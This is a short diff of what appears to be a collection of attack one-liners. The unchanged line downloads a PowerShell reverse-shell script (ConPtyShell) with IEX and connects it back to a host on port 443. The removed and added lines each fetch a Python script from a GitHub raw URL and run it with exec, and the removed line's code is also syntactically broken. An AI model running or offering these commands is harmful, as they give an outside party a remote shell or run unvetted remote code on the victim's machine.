@@ -1,2 +1,2 @@
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.4 443
-python -c 'import urllib2;r=urllib2.urlopen("https://raw.githubusercontent.com/n00py/ReadingList/master/test.py");exec(http://r.read())'
+python -c 'import requests;r=requests.get("https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/remote.py");exec(r.text)'
